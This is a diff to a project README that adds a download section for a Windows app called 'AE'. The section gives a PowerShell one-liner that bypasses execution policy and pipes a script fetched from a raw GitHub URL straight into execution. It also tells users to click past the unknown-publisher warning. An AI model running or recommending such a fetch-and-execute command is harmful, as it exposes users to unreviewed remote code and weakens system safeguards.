@@ -17,6 +17,20 @@ its own window, message loop, compositor and HTTP client — Windows never invol
 a browser in rendering AE, so the taskbar, Alt+Tab and Start-menu search all say
 **AE**.
 
+## Download
+
+**https://github.com/SPORstudio-Official/moddelingmym/raw/arena/1c294196-moddelingmym/dist/download.html**
+
+That page has a single install button. Or, one line in PowerShell:
+
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://github.com/SPORstudio-Official/moddelingmym/raw/arena/1c294196-moddelingmym/dist/install-ae.ps1 | iex"
+```
+
+It downloads AE, verifies the SHA-256, installs it to `%LOCALAPPDATA%\AE`, adds a
+Start-menu shortcut and starts it. Windows warns that the publisher is unknown
+because the binary is not code-signed — **More info → Run anyway**.
+
 ## Build
 
 ```sh
